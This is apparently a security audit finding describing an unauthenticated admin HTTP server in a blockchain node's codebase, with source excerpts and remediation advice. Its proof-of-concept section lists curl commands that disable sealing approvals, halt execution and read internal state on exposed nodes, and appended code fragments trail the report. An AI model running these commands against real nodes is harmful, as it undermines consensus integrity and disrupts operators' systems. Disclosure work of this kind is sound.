### Title
Unauthenticated Admin HTTP Server Exposes Privileged Node Configuration Mutation Without Any Identity Check - (`admin/command_runner.go`)

### Summary

The `runAdminServer` function in `admin/command_runner.go` starts an HTTP server that serves all admin commands with **no authentication middleware**. mTLS is entirely optional and disabled by default. When the admin server is bound to a network-accessible address (the documented and supported pattern, e.g. `0.0.0.0:9002`), any unauthenticated network caller can invoke privileged commands — including `set-config`, which can mutate live consensus parameters such as `consensus-required-approvals-for-sealing`.

### Finding Description

`runAdminServer` constructs the HTTP mux and starts the server with no authentication layer:

```go
mux := http.NewServeMux()
mux.Handle("/", gwmux)
// pprof endpoints also added without auth
httpServer := &http.Server{
    Addr:      r.httpAddress,
    Handler:   mux,
    TLSConfig: r.tlsConfig,
}
``` [1](#0-0) 

`tlsConfig` is `nil` by default; mTLS is only applied when all three of `AdminCert`, `AdminKey`, and `AdminClientCAs` are explicitly provided by the operator:

```go
if node.AdminCert != NotSet {
    // ... load certs and build tls.Config with RequireAndVerifyClientCert
    opts = append(opts, admin.WithTLS(config))
}
``` [2](#0-1) 

Without mTLS, the server calls `httpServer.ListenAndServe()` — plain HTTP, no token, no session, no identity check:

```go
if r.tlsConfig == nil {
    err = httpServer.ListenAndServe()
} else {
    err = httpServer.ListenAndServeTLS("", "")
}
``` [3](#0-2) 

Every registered admin command is reachable via `POST /admin/run_command`. The default registered commands include:

- `set-log-level` / `set-golog-level` — changes global log verbosity
- `set-config` — mutates any dynamically updatable config field
- `stop-at-height` — halts execution at a caller-specified block height
- `ingest-tx-rate-limit` — modifies per-payer transaction rate limits on collection nodes
- `get-transactions`, `read-blocks`, `get-latest-identity` — exposes internal node state [4](#0-3) 

The `set-config` command accepts arbitrary field names and values, validated only against the registered `updatable_configs.Manager`. One registered field is `consensus-required-approvals-for-sealing`:

```
curl localhost:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
``` [5](#0-4) 

The same pattern exists in the standalone ledger service admin server (`cmd/ledger/admin.go`), which has no authentication at all — not even optional mTLS — and the README explicitly documents binding it to `0.0.0.0:9003`:

```go
adminServer = &http.Server{
    Addr:    *adminAddr,
    Handler: adminHandler,
}
``` [6](#0-5) [7](#0-6) 

### Impact Explanation

An attacker with network access to the admin port (no credentials required) can:

1. **Consensus integrity violation**: Set `consensus-required-approvals-for-sealing` to `0` on a consensus node. This removes the requirement for verification node result approvals before sealing, allowing execution results to be finalized without any chunk verification — directly undermining the correctness guarantee of the verification layer.

2. **Execution halt**: Issue `stop-at-height` to freeze an execution node at an attacker-chosen block height, stalling block processing for that node.

3. **Rate-limit bypass on collection nodes**: Use `ingest-tx-rate-limit` to remove per-payer rate limits, enabling spam transaction flooding into the mempool.

4. **Internal state disclosure**: Read block data, transaction data, and node identity information via `read-blocks`, `get-transactions`, `get-latest-identity` without any authorization.

The consensus integrity impact (item 1) is the most severe: it allows invalid execution results to pass sealing without verification approvals, violating a core protocol invariant.

### Likelihood Explanation

The admin server is enabled whenever `--admin-addr` is set. The official documentation and README examples show `0.0.0.0:9002` / `0.0.0.0:9003` as the standard bind address. In containerized deployments (Docker, Kubernetes), port `9002` is routinely mapped to host interfaces for operational access. Any attacker with access to the host network segment — including a co-tenant in a shared cloud environment, a compromised adjacent service, or a malicious unstaked observer node on the same host — can reach the port and issue commands with no credentials. [8](#0-7) 

### Recommendation

1. **Enforce authentication by default**: Add an HTTP middleware that rejects all requests lacking a valid bearer token or client certificate before routing to any admin handler. Do not make authentication opt-in.
2. **Default bind to loopback**: Change the default `--admin-addr` to `127.0.0.1:9002` and require explicit operator opt-in to bind to non-loopback interfaces.
3. **Require mTLS unconditionally** when the admin server is bound to any non-loopback address; reject startup if certs are absent and the bind address is not localhost.
4. **Apply the same fix to `cmd/ledger/admin.go`**, which has no authentication path at all.

### Proof of Concept

Assuming an execution or consensus node with `--admin-addr=0.0.0.0:9002` and no mTLS configured (the default when certs are not provided):

```bash
# 1. Enumerate available commands (no credentials needed)
curl -s http://<NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "list-commands"}'

# 2. Disable verification approval requirement on a consensus node
curl -s http://<NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config",
       "data": {"consensus-required-approvals-for-sealing": 0}}'
# Response: {"output":{"newValue":0,"oldValue":1}}

# 3. Read internal block state
curl -s http://<NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "read-blocks", "data": {"block": "final"}}'

# 4. Halt execution at next block on an execution node
curl -s http://<NODE_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "stop-at-height",
       "data": {"height": 1, "crash": false}}'
```

All four requests succeed with HTTP 200 and no authentication challenge, because `runAdminServer` installs no authentication middleware and `tlsConfig` is `nil` by default. [9](#0-8)

func (r *CommandRunner) runAdminServer(ctx irrecoverable.SignalerContext) error {
	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
	}

	r.logger.Info().Msg("admin server starting up")

	// Remove stale socket file from previous run (e.g. after container/process restart)
	if _, err := os.Stat(r.grpcAddress); err == nil {
		if removeErr := os.Remove(r.grpcAddress); removeErr != nil {
			r.logger.Warn().Err(removeErr).Str("socket", r.grpcAddress).Msg("failed to remove stale admin socket")
		}
	}

	listener, err := net.Listen("unix", r.grpcAddress)
	if err != nil {
		return fmt.Errorf("failed to listen on admin server address: %w", err)
	}

	opts := []grpc.ServerOption{
		grpc.MaxRecvMsgSize(r.maxMsgSize),
		grpc.MaxSendMsgSize(r.maxMsgSize),
	}

	grpcServer := grpc.NewServer(opts...)
	pb.RegisterAdminServer(grpcServer, NewAdminServer(r))

	r.workersStarted.Add(1)
	r.workersFinished.Go(func() {
		r.workersStarted.Done()

		if err := grpcServer.Serve(listener); err != nil {
			r.logger.Err(err).Msg("gRPC server encountered fatal error")
			ctx.Throw(err)
		}
	})

	// Initialize gRPC and HTTP muxers
	gwmux := runtime.NewServeMux()
	dialOpts := []grpc.DialOption{
		grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(r.maxMsgSize)),
		grpc.WithTransportCredentials(insecure.NewCredentials()),
	}
	err = pb.RegisterAdminHandlerFromEndpoint(ctx, gwmux, "unix:///"+r.grpcAddress, dialOpts)
	if err != nil {
		return fmt.Errorf("failed to register http handlers for admin service: %w", err)
	}

	mux := http.NewServeMux()
	mux.Handle("/", gwmux)

	// This adds an ability to use standard go tooling for performance troubleshooting e.g.:
	//  go tool pprof http://localhost:9002/debug/pprof/goroutine
	for _, name := range []string{"allocs", "block", "goroutine", "heap", "mutex", "threadcreate"} {
		mux.HandleFunc(fmt.Sprintf("/debug/pprof/%s", name), pprof.Handler(name).ServeHTTP)
	}
	mux.HandleFunc("/debug/pprof/profile", pprof.Profile)
	mux.HandleFunc("/debug/pprof/trace", pprof.Trace)

	httpServer := &http.Server{
		Addr:      r.httpAddress,
		Handler:   mux,
		TLSConfig: r.tlsConfig,
	}
```

func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
